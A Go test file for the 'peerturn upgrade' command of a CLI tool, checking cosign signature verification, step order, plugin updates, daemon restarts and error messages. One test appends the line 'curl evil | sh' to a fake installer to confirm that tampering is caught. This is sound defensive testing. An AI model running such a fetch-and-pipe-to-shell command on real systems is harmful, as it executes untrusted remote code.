package main

import (
	"encoding/json"
	"os"
	"slices"
	"strings"
	"testing"
)

const upgradeNote = "Sessions that are already open keep the old plugin until /reload-plugins; new sessions use the new one.\n"

func TestUpgradeVerifiesInstallsSetsUpAndRestartsInOrder(t *testing.T) {
	f := newUpgradeFake(t)
	got := f.run()
	if got.code != 0 || got.stderr != "" {
		t.Fatalf("code=%d stderr=%q", got.code, got.stderr)
	}
	want := "PeerTurn 0.1.9-preview → 0.2.0-preview: installed (publisher signature verified); Claude plugin updated; daemon restarted (profile, peers and links kept).\n" + upgradeNote
	if got.stdout != want {
		t.Fatalf("stdout:\n%s\nwant:\n%s", got.stdout, want)
	}
	if steps, wantSteps := f.sequence(), []string{"verify", "install", "setup claude", "stop", "start"}; !slices.Equal(steps, wantSteps) {
		t.Fatalf("steps = %v, want %v", steps, wantSteps)
	}
	if len(f.scripts) != 1 || f.scripts[0] != upgradeSh {
		t.Fatalf("the installer ran %q, want the verified script", f.scripts)
	}
	if want := []string{f.binPath(), "daemon", "start"}; !slices.Equal(f.spawnedArgv, want) {
		t.Fatalf("daemon argv = %v, want %v", f.spawnedArgv, want)
	}
	for _, entry := range f.spawnedEnv {
		if strings.HasPrefix(entry, "ANTHROPIC_API_KEY=") {
			t.Fatal("provider credentials were passed to the restarted daemon")
		}
	}
}

func TestUpgradeJSONResult(t *testing.T) {
	f := newUpgradeFake(t)
	got := f.run("--json")
	want := `{"current":"0.1.9-preview","latest":"0.2.0-preview","installed":true,"plugins":["claude"],"daemon":"restarted"}` + "\n"
	if got.code != 0 || got.stdout != want || got.stderr != "" {
		t.Fatalf("code=%d stdout=%q stderr=%q, want %q", got.code, got.stdout, got.stderr, want)
	}
}

func TestUpgradeUpdatesEveryHostOnPath(t *testing.T) {
	f := newUpgradeFake(t)
	f.hosts["codex"] = true
	got := f.run()
	if steps, want := f.sequence(), []string{"verify", "install", "setup claude", "setup codex", "stop", "start"}; !slices.Equal(steps, want) {
		t.Fatalf("steps = %v, want %v", steps, want)
	}
	if !strings.Contains(got.stdout, "Claude and Codex plugins updated;") {
		t.Fatalf("stdout = %q", got.stdout)
	}
	f = newUpgradeFake(t)
	f.hosts = map[string]bool{"codex": true}
	got = f.run()
	if !strings.Contains(got.stdout, "Codex plugin updated;") || strings.Contains(got.stdout, "/reload-plugins") {
		t.Fatalf("stdout = %q; the Claude-only reload note must not appear for Codex", got.stdout)
	}
}

func TestUpgradeWithoutHostsOrDaemon(t *testing.T) {
	f := newUpgradeFake(t)
	f.hosts, f.daemonUp = map[string]bool{}, false
	got := f.run()
	want := "PeerTurn 0.1.9-preview → 0.2.0-preview: installed (publisher signature verified); plugins: none; daemon not running.\n"
	if got.code != 0 || got.stdout != want {
		t.Fatalf("code=%d stdout=%q, want %q", got.code, got.stdout, want)
	}
	if steps, wantSteps := f.sequence(), []string{"verify", "install"}; !slices.Equal(steps, wantSteps) {
		t.Fatalf("steps = %v; a stopped daemon must stay stopped, want %v", steps, wantSteps)
	}
	f = newUpgradeFake(t)
	f.hosts, f.daemonUp = map[string]bool{}, false
	var result upgradeResult
	if err := json.Unmarshal([]byte(f.run("--json").stdout), &result); err != nil ||
		result.Daemon != "not_running" || !result.Installed || len(result.Plugins) != 0 {
		t.Fatalf("result = %+v, %v", result, err)
	}
}

func TestUpgradeKeepsDaemonThatAlreadyRunsTheNewVersion(t *testing.T) {
	f := newUpgradeFake(t)
	f.daemonVersion = upgradeNew
	got := f.run()
	if !strings.Contains(got.stdout, "daemon already current") || slices.Contains(f.sequence(), "stop") || slices.Contains(f.sequence(), "start") {
		t.Fatalf("stdout=%q steps=%v", got.stdout, f.sequence())
	}
}

func TestUpgradeWaitsForTheOldDaemonToStop(t *testing.T) {
	f := newUpgradeFake(t)
	f.lingering = 3
	got := f.run()
	if got.code != 0 || f.waits < 3 {
		t.Fatalf("code=%d waits=%d stderr=%q", got.code, f.waits, got.stderr)
	}
	if steps := f.sequence(); steps[len(steps)-2] != "stop" || steps[len(steps)-1] != "start" {
		t.Fatalf("steps = %v", steps)
	}
}

func TestUpgradeFailsWhenTheOldDaemonDoesNotStop(t *testing.T) {
	f := newUpgradeFake(t)
	f.stopHangs = true
	got := f.run()
	if got.code != 1 || !strings.Contains(got.stderr, "did not stop within 10 seconds") || !strings.Contains(got.stderr, "peerturn daemon stop") ||
		slices.Contains(f.sequence(), "start") || f.waits > 60 {
		t.Fatalf("code=%d stderr=%q waits=%d steps=%v", got.code, got.stderr, f.waits, f.sequence())
	}
}

func TestUpgradeReportsADaemonThatExitsAtStart(t *testing.T) {
	f := newUpgradeFake(t)
	f.spawnExits = true
	got := f.run()
	if got.code != 1 || !strings.Contains(got.stderr, "peerturn: upgrade failed: ") || !strings.Contains(got.stderr, "peerturn daemon start") {
		t.Fatalf("code=%d stderr=%q", got.code, got.stderr)
	}
}

func TestUpgradeSignatureFailureStopsBeforeInstall(t *testing.T) {
	f := newUpgradeFake(t)
	f.installCosign("v3.1.3", 1, "Error: none of the expected identities matched\n")
	got := f.run()
	if got.code != 1 || got.stdout != "" || !strings.HasPrefix(got.stderr, "peerturn: upgrade failed: ") ||
		!strings.Contains(got.stderr, "signature") || !strings.Contains(got.stderr, "nothing was installed") {
		t.Fatalf("code=%d stdout=%q stderr=%q", got.code, got.stdout, got.stderr)
	}
	if steps := f.sequence(); !slices.Equal(steps, []string{"verify"}) {
		t.Fatalf("steps = %v; nothing may follow a failed verification", steps)
	}
}

func TestUpgradeTamperedInstallerStopsBeforeInstall(t *testing.T) {
	f := newUpgradeFake(t)
	f.assets["install.sh"] += "curl evil | sh\n"
	got := f.run()
	if got.code != 1 || !strings.Contains(got.stderr, "install.sh") || slices.Contains(f.sequence(), "install") {
		t.Fatalf("code=%d stderr=%q steps=%v", got.code, got.stderr, f.sequence())
	}
}

func TestUpgradeRequiresCosign(t *testing.T) {
	f := newUpgradeFake(t)
	if err := os.Remove(f.binDir + "/cosign"); err != nil {
		t.Fatal(err)
	}
	got := f.run()
	want := "peerturn: upgrade failed: cosign is not installed; install cosign ≥ 3.1.3 (brew install cosign) and rerun peerturn upgrade\n"
	if got.code != 1 || got.stderr != want || len(f.downloads) != 0 || len(f.sequence()) != 0 {
		t.Fatalf("code=%d stderr=%q downloads=%v", got.code, got.stderr, f.downloads)
	}
}

func TestUpgradeInstallerFailureNamesItsReason(t *testing.T) {
	f := newUpgradeFake(t)
	f.installFails = true
	got := f.run()
	if got.code != 1 || !strings.Contains(got.stderr, "archive checksum mismatch") || !strings.Contains(got.stderr, "rerun peerturn upgrade") ||
		slices.Contains(f.sequence(), "setup claude") || slices.Contains(f.sequence(), "stop") {
		t.Fatalf("code=%d stderr=%q steps=%v", got.code, got.stderr, f.sequence())
	}
}

func TestUpgradeSetupFailureLeavesTheDaemonUntouched(t *testing.T) {
	f := newUpgradeFake(t)
	f.setupFails["claude"] = true
	got := f.run()
	if got.code != 1 || !strings.Contains(got.stderr, "Claude plugin update failed") || !strings.Contains(got.stderr, "peerturn setup claude") ||
		!strings.Contains(got.stderr, "rerun peerturn upgrade") || strings.Contains(got.stderr, `"host"`) {
		t.Fatalf("code=%d stderr=%q", got.code, got.stderr)
	}
	if steps := f.sequence(); slices.Contains(steps, "stop") || slices.Contains(steps, "start") {
		t.Fatalf("the daemon was restarted after a failed plugin update: %v", steps)
	}
}

func TestUpgradeShowsToolOutputOnlyWithVerbose(t *testing.T) {
	f := newUpgradeFake(t)
	quiet := f.run()
	if strings.Contains(quiet.stdout+quiet.stderr, "Release source") || strings.Contains(quiet.stdout+quiet.stderr, `"host"`) {
		t.Fatalf("tool output leaked without --verbose: %q %q", quiet.stdout, quiet.stderr)
	}
	f = newUpgradeFake(t)
	loud := f.run("--verbose")
	if !strings.Contains(loud.stderr, "Release source") || !strings.Contains(loud.stderr, `"host":"claude"`) {
		t.Fatalf("--verbose hid tool output: stderr=%q", loud.stderr)
	}
	if !strings.HasPrefix(loud.stdout, "PeerTurn 0.1.9-preview → 0.2.0-preview: installed") {
		t.Fatalf("stdout = %q", loud.stdout)
	}
}

func TestUpgradeSkipsInstallWhenTheVersionIsAlreadyUnpacked(t *testing.T) {
	f := newUpgradeFake(t)
	f.writeBinary(f.versionDir(upgradeNew), upgradeNew)
	got := f.run()
	want := "PeerTurn 0.1.9-preview → 0.2.0-preview: already installed; Claude plugin updated; daemon restarted (profile, peers and links kept).\n" + upgradeNote
	if got.code != 0 || got.stdout != want {
		t.Fatalf("code=%d stdout=%q stderr=%q", got.code, got.stdout, got.stderr)
	}
	if steps, wantSteps := f.sequence(), []string{"setup claude", "stop", "start"}; !slices.Equal(steps, wantSteps) || len(f.downloads) != 0 {
		t.Fatalf("steps = %v downloads=%v; want %v without downloads", steps, f.downloads, wantSteps)
	}
	if data, err := readInstalledFile(f.binPath()); err != nil || string(data) != "version:"+upgradeNew {
		t.Fatalf("~/.local/bin/peerturn = %q, %v; the unpacked version must be linked in", data, err)
	}
}

func TestUpgradeRefusesABrokenVersionDirectory(t *testing.T) {
	f := newUpgradeFake(t)
	if err := os.MkdirAll(f.versionDir(upgradeNew), 0o700); err != nil {
		t.Fatal(err)
	}
	got := f.run()
	if got.code != 1 || !strings.Contains(got.stderr, f.versionDir(upgradeNew)) || !strings.Contains(got.stderr, "remove it") || len(f.sequence()) != 0 {
		t.Fatalf("code=%d stderr=%q steps=%v", got.code, got.stderr, f.sequence())
	}
}

func TestUpgradeWhenCurrentThenFinishesAStaleDaemon(t *testing.T) {
	f := newUpgradeFake(t)
	f.current, f.latestTag = upgradeNew, upgradeTag
	f.writeBinary(f.versionDir(upgradeNew), upgradeNew)
	f.writeBinary(f.binPath(), upgradeNew)
	got := f.run()
	want := "PeerTurn 0.2.0-preview: already installed; Claude plugin updated; daemon restarted (profile, peers and links kept).\n" + upgradeNote
	if got.code != 0 || got.stdout != want {
		t.Fatalf("code=%d stdout=%q stderr=%q", got.code, got.stdout, got.stderr)
	}
	if steps, wantSteps := f.sequence(), []string{"setup claude", "stop", "start"}; !slices.Equal(steps, wantSteps) {
		t.Fatalf("steps = %v, want %v", steps, wantSteps)
	}
}

func TestUpgradeWhenCurrentAndDaemonCurrentDoesNothing(t *testing.T) {
	f := newUpgradeFake(t)
	f.current, f.daemonVersion = upgradeNew, upgradeNew
	f.writeBinary(f.binPath(), upgradeNew)
	got := f.run()
	// Plugin setup is idempotent and finishes an upgrade that stopped after installing.
	if want := "PeerTurn 0.2.0-preview is the latest release; Claude plugin updated.\n"; got.code != 0 || got.stdout != want || !slices.Equal(f.sequence(), []string{"setup claude"}) {
		t.Fatalf("code=%d stdout=%q steps=%v", got.code, got.stdout, f.sequence())
	}
	f.daemonUp = false
	if got = f.run("--json"); got.stdout != `{"current":"0.2.0-preview","latest":"0.2.0-preview","installed":false,"plugins":["claude"],"daemon":"not_running"}`+"\n" {
		t.Fatalf("stdout = %q", got.stdout)
	}
}
